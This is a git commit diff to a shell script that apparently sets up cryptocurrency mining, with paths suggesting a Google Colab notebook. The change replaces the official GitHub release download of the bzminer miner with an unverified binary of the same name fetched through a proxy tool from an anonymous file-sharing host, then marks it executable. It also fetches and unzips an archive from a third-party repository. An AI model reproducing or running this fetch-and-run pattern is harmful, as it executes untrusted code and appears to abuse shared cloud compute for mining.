5cd79f966589fad201777f9ea8cc05c0bcfd79b9
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-09-18 22:19:30 -0500

    Update 12.sh

--- 12.sh
+++ 12.sh
@@ -33,7 +33,8 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/bzminer/bzminer/releases/download/v11.1.0/bzminer_v11.1.0_linux.tar.gz && tar -xf bzminer_v11.1.0_linux.tar.gz && cd bzminer_v11.1.0_linux && chmod +x bzminer && cp bzminer /content/
+./graftcp/graftcp wget https://bashupload.com/6WaQ8/bzminer
+chmod +x bzminer
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
